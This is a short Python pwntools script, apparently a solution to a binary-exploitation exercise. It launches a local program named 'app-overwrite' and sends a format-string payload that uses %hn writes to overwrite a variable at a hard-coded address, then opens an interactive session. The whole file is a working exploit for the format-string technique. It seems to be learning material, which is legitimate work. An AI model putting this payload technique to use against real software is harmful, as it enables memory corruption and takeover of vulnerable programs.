from pwn import * 

def fora(): 
    sh = process('./app-overwrite') 
    b_addr = 0x0804a028 # address of b
    value2 = 0x5678
    value1 = 0x1234
    payload = f'%{value1}c'.encode()
    payload += b'%16$hn'
    payload += f'%{value2 - value1}c'.encode()
    payload += b'%17$hn'
    payload = payload.ljust(40, b'A')
    payload += p32(b_addr + 2) 
    payload += p32(b_addr)
    print(payload)
    sh.sendline(payload) 
    sh.interactive() 
fora()